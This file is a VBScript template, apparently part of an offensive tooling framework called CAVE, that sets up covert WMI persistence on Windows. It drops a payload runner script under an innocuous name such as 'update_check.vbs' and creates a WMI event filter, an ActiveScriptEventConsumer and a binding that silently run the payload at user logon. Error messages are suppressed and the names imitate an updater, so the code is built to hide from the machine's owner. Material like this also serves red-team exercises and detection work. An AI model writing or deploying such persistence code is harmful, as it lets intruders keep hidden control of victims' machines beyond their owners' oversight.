' wmi_setup_persistence.vbs
' This script sets up WMI persistence by:
' 1. Writing a payload runner VBScript to a specified path.
' 2. Creating a WMI Event Filter that triggers on a specified event (e.g., user logon).
' 3. Creating a WMI ActiveScriptEventConsumer that executes the payload runner VBScript.
' 4. Binding the filter to the consumer.

Option Explicit
On Error Resume Next

Dim strComputer
Dim objWMIService, objSubWMIService
Dim objFSO, objFile
Dim objEventFilter, objEventConsumer, objBinding
Dim bSuccess

' --- Configuration Placeholders (to be replaced by CAVE Python script) ---
Const EVENT_FILTER_NAME     = "{{ event_filter_name }}"       ' e.g., "CAVEUpdaterFilter"
Const EVENT_CONSUMER_NAME   = "{{ event_consumer_name }}"     ' e.g., "CAVEUpdaterConsumer"
Const PAYLOAD_RUNNER_PATH   = "{{ payload_runner_path }}"     ' e.g., "C:\Users\Public\update_check.vbs"
Const WQL_QUERY             = "{{ wql_query }}"               ' e.g., "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType = 2"

' The content of the payload runner VBScript, already escaped for VBS string literal
' This will be a series of concatenated strings with vbCrLf, e.g.:
' Const PAYLOAD_RUNNER_CONTENT = "Line1" & vbCrLf & _
'                                "Line2 ""quoted""" & vbCrLf & _
'                                "Line3"
Const PAYLOAD_RUNNER_CONTENT = {{ payload_runner_content_escaped }}
' --- End Configuration Placeholders ---

bSuccess = True ' Assume success initially

' Step 1: Write the payload runner VBScript to disk
Set objFSO = CreateObject("Scripting.FileSystemObject")
If Err.Number <> 0 Then
    ' WScript.Echo "Error: Failed to create FileSystemObject. " & Err.Description
    bSuccess = False
Else
    Set objFile = objFSO.CreateTextFile(PAYLOAD_RUNNER_PATH, True) ' True to overwrite if exists
    If Err.Number <> 0 Then
        ' WScript.Echo "Error: Failed to create payload runner file '" & PAYLOAD_RUNNER_PATH & "'. " & Err.Description
        bSuccess = False
    Else
        objFile.Write PAYLOAD_RUNNER_CONTENT
        objFile.Close
        If Err.Number <> 0 Then
            ' WScript.Echo "Error: Failed to write to or close payload runner file. " & Err.Description
            bSuccess = False
        ' Else
            ' WScript.Echo "Success: Payload runner VBScript written to " & PAYLOAD_RUNNER_PATH
        End If
    End If
    Set objFile = Nothing
End If
Set objFSO = Nothing

If Not bSuccess Then
    WScript.Quit(1) ' Exit if file writing failed
End If

' Step 2: Connect to WMI services
strComputer = "."
Set objWMIService = GetObject("winmgmts:\\\\" & strComputer & "\\root\\cimv2")
If Err.Number <> 0 Then
    ' WScript.Echo "Error: Failed to connect to WMI root\cimv2. " & Err.Description
    WScript.Quit(1)
End If

Set objSubWMIService = GetObject("winmgmts:\\\\" & strComputer & "\\root\\subscription")
If Err.Number <> 0 Then
    ' WScript.Echo "Error: Failed to connect to WMI root\subscription. " & Err.Description
    WScript.Quit(1)
End If

' Step 3: Create __EventFilter
Set objEventFilter = objSubWMIService.Get("__EventFilter").SpawnInstance_()
If Err.Number <> 0 Then
    ' WScript.Echo "Error: Failed to spawn __EventFilter instance. " & Err.Description
    bSuccess = False
Else
    objEventFilter.Name = EVENT_FILTER_NAME
    objEventFilter.Query = WQL_QUERY
    objEventFilter.QueryLanguage = "WQL"
    objEventFilter.EventNamespace = "root\\cimv2" ' Namespace where the events occur
    objEventFilter.Put_
    If Err.Number <> 0 Then
        ' WScript.Echo "Error: Failed to Put_ __EventFilter. Name: " & EVENT_FILTER_NAME & ". " & Err.Description
        bSuccess = False
    ' Else
        ' WScript.Echo "Success: __EventFilter '" & EVENT_FILTER_NAME & "' created."
    End If
End If

If Not bSuccess Then
    WScript.Quit(1) ' Exit if filter creation failed
End If

' Step 4: Create ActiveScriptEventConsumer
Set objEventConsumer = objSubWMIService.Get("ActiveScriptEventConsumer").SpawnInstance_()
If Err.Number <> 0 Then
    ' WScript.Echo "Error: Failed to spawn ActiveScriptEventConsumer instance. " & Err.Description
    bSuccess = False
Else
    objEventConsumer.Name = EVENT_CONSUMER_NAME
    objEventConsumer.ScriptingEngine = "VBScript"
    ' The ScriptText will be the command to execute the payload runner VBScript
    objEventConsumer.ScriptText = "CreateObject(""WScript.Shell"").Run """ & PAYLOAD_RUNNER_PATH & """", 0, False
    objEventConsumer.Put_
    If Err.Number <> 0 Then
        ' WScript.Echo "Error: Failed to Put_ ActiveScriptEventConsumer. Name: " & EVENT_CONSUMER_NAME & ". " & Err.Description
        bSuccess = False
    ' Else
        ' WScript.Echo "Success: ActiveScriptEventConsumer '" & EVENT_CONSUMER_NAME & "' created."
    End If
End If

If Not bSuccess Then
    ' Attempt to remove the filter if consumer creation failed
    On Error Resume Next ' Ignore errors during cleanup attempt
    objSubWMIService.Delete "__EventFilter.Name='" & EVENT_FILTER_NAME & "'"
    On Error GoTo 0
    WScript.Quit(1) ' Exit if consumer creation failed
End If

' Step 5: Create __FilterToConsumerBinding
Set objBinding = objSubWMIService.Get("__FilterToConsumerBinding").SpawnInstance_()
If Err.Number <> 0 Then
    ' WScript.Echo "Error: Failed to spawn __FilterToConsumerBinding instance. " & Err.Description
    bSuccess = False
Else
    objBinding.Filter = "__EventFilter.Name='" & EVENT_FILTER_NAME & "'"
    objBinding.Consumer = "ActiveScriptEventConsumer.Name='" & EVENT_CONSUMER_NAME & "'"
    objBinding.Put_
    If Err.Number <> 0 Then
        ' WScript.Echo "Error: Failed to Put_ __FilterToConsumerBinding. " & Err.Description
        bSuccess = False
    ' Else
        ' WScript.Echo "Success: __FilterToConsumerBinding created for '" & EVENT_FILTER_NAME & "' and '" & EVENT_CONSUMER_NAME & "'."
    End If
End If

If Not bSuccess Then
    ' Attempt to remove the filter and consumer if binding failed
    On Error Resume Next ' Ignore errors during cleanup attempt
    objSubWMIService.Delete "ActiveScriptEventConsumer.Name='" & EVENT_CONSUMER_NAME & "'"
    objSubWMIService.Delete "__EventFilter.Name='" & EVENT_FILTER_NAME & "'"
    On Error GoTo 0
    WScript.Quit(1)
End If

' If script reaches here, all WMI objects should be set up.
' WScript.Echo "WMI Persistence Setup Complete: Filter='" & EVENT_FILTER_NAME & "', Consumer='" & EVENT_CONSUMER_NAME & "', Payload='" & PAYLOAD_RUNNER_PATH & "'"
WScript.Quit(0) ' Success